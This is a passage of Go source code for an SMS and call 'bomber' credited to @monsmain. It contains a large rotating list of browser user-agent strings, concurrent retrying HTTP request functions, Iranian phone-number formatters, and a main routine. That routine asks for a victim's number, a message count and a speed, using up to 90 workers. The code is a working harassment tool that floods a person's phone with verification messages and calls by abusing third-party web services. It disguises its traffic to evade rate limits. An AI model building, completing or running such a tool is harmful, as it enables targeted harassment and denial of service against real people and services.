	"Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Edg/104.0.1293.63",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 OPR/90.0.4480.54",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Vivaldi/5.0.2497.51",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 YaBrowser/22.3.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Vivaldi/6.0.2979.25",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 YaBrowser/23.6.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.71",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 OPR/89.0.4447.83",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.0.2497.35",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 YaBrowser/22.1.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Vivaldi/5.6.2800.50",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 YaBrowser/23.5.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:101.0) Gecko/20100101 Firefox/101.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:101.0) Gecko/20100101 Firefox/101.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Edg/102.0.1245.30",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 OPR/88.0.4411.159",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Vivaldi/4.4.2570.56",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 YaBrowser/22.1.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Vivaldi/5.5.2805.38",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.4.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Edg/101.0.1210.39",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 OPR/87.0.4390.45",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Vivaldi/4.3.2439.65",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 YaBrowser/21.11.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Vivaldi/5.4.2753.37",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 YaBrowser/23.3.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36 Edg/100.0.1185.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36 OPR/86.0.4363.59",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36 Vivaldi/4.2.2406.54",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 YaBrowser/21.10.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Vivaldi/5.3.2679.70",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaBrowser/23.2.0.0 Safari/537.36",
}


//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]


	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
        req.Header.Set("User-Agent", selectedUserAgent)


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p)
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}

func main() {

	rand.Seed(time.Now().UnixNano())

	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 
//Code by @monsmain
	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 90 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 40 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 40 
